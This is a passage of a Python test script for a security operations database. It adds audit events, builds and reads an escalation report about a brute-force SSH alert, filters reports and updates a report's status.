    )

    audit_id = database.add_audit_event(
        action="Alert Assigned",
        analyst_id=analyst_id,
        alert_id="ALT-1001",
        details="Alert assigned to Analyst 01"
    )

    print(
        f"Audit event ID: {audit_id}"
    )

    # --------------------------------------------------------
    # 5. READ AUDIT EVENT
    # --------------------------------------------------------

    audit = database.get_audit_event(
        audit_id
    )

    print()
    print("Audit event:")

    print(
        f"  ID: {audit['id']}"
    )

    print(
        f"  Time: {audit['timestamp']}"
    )

    print(
        f"  Analyst: "
        f"{audit['analyst_username']}"
    )

    print(
        f"  Action: {audit['action']}"
    )

    print(
        f"  Alert: {audit['alert_id']}"
    )

    print(
        f"  Details: {audit['details']}"
    )

    # --------------------------------------------------------
    # 6. CREATE ANOTHER AUDIT EVENT
    # --------------------------------------------------------

    database.add_audit_event(
        action="Investigation Started",
        analyst_id=analyst_id,
        alert_id="ALT-1001",
        details="Analyst started investigating alert"
    )

    database.add_audit_event(
        action="Enrichment Requested",
        analyst_id=analyst_id,
        alert_id="ALT-1001",
        details="IOC enrichment requested"
    )

    # --------------------------------------------------------
    # 7. RETRIEVE ALERT TIMELINE
    # --------------------------------------------------------

    print()
    print(
        "Audit events for ALT-1001:"
    )

    alert_audit = database.get_audit_log(
        alert_id="ALT-1001"
    )

    for event in alert_audit:

        print(
            f"  {event['timestamp']} | "
            f"{event['analyst_username']} | "
            f"{event['action']} | "
            f"{event['details']}"
        )

    print()
    print(
        f"ALT-1001 audit event count: "
        f"{len(alert_audit)}"
    )

    # --------------------------------------------------------
    # 8. CREATE REPORT
    # --------------------------------------------------------

    print()
    print(
        "Creating escalation report..."
    )

    report_id = "REP-TEST001"

    database.add_report(
        report_id=report_id,
        alert_id="ALT-1001",
        analyst_id=analyst_id,
        severity="CRITICAL",
        status="Awaiting Management",
        summary=(
            "The alert indicates a brute-force "
            "SSH authentication attempt."
        ),
        evidence=(
            "Multiple failed authentication attempts "
            "originated from 185.23.44.12."
        ),
        findings=(
            "The source IP generated suspicious "
            "SSH authentication activity."
        ),
        recommendation=(
            "Block the source IP and review "
            "the targeted host for additional activity."
        )
    )

    print(
        f"Report ID: {report_id}"
    )

    # --------------------------------------------------------
    # 9. READ REPORT
    # --------------------------------------------------------

    report = database.get_report(
        report_id
    )

    print()
    print("Report:")

    print(
        f"  ID: {report['id']}"
    )

    print(
        f"  Alert: {report['alert_id']}"
    )

    print(
        f"  Analyst: "
        f"{report['analyst_username']}"
    )

    print(
        f"  Severity: "
        f"{report['severity']}"
    )

    print(
        f"  Status: "
        f"{report['status']}"
    )

    print(
        f"  Summary: "
        f"{report['summary']}"
    )

    print(
        f"  Evidence: "
        f"{report['evidence']}"
    )

    print(
        f"  Findings: "
        f"{report['findings']}"
    )

    print(
        f"  Recommendation: "
        f"{report['recommendation']}"
    )

    # --------------------------------------------------------
    # 10. TEST REPORT FILTER
    # --------------------------------------------------------

    print()
    print(
        "Reports associated with ALT-1001:"
    )

    reports = database.get_reports(
        alert_id="ALT-1001"
    )

    for item in reports:

        print(
            f"  {item['id']} | "
            f"{item['severity']} | "
            f"{item['analyst_username']} | "
            f"{item['status']}"
        )

    print()
    print(
        f"Report count for ALT-1001: "
        f"{len(reports)}"
    )

    # --------------------------------------------------------
    # 11. UPDATE REPORT STATUS
    # --------------------------------------------------------

    print()
    print(
        "Updating report status..."
    )

    rows_updated = database.update_report_status(
        report_id,
        "Under Review"
    )

    print(
        f"Rows updated: {rows_updated}"
    )

    updated_report = database.get_report(
        report_id
    )

    print(
        f"  Current status: "
        f"{updated_report['status']}"
    )

    # --------------------------------------------------------
    # 12. FINAL COUNTS
    # --------------------------------------------------------

    print()
    print(
        "Final counts:"
    )

    print(
        f"  Audit events: "
        f"{len(database.get_audit_log())}"
    )

    print(
        f"  Reports: "
        f"{len(database.get_reports())}"
    )

    print()
    print(
        "Audit + report database test "
        "completed successfully."
    )